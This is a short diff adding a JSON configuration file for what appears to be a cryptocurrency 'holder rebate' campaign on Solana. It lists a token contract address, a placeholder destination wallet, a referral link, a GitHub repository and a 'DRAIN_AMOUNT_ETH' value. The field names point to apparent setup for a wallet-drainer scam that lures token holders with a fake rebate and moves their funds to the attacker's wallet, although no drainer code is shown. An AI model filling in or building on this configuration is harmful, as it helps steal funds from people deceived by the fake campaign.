@@ -1,0 +1,11 @@
+{
+  "CA": "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDtVv",
+  "ETH_ADDRESS": "0xYOUR_DESTINATION_WALLET",
+  "REF_DOMAIN": "twitter.com/pumpFunCampaign",
+  "CAMPAIGN_NAME": "$PUMP Holder Rebate",
+  "CHAIN": "solana",
+  "DRAIN_AMOUNT_ETH": "0.05",
+  "EXPIRY_MS": 86400000,
+  "GITHUB_REPO": "kheznn/pumpFun",
+  "BRANCH": "main"
+}
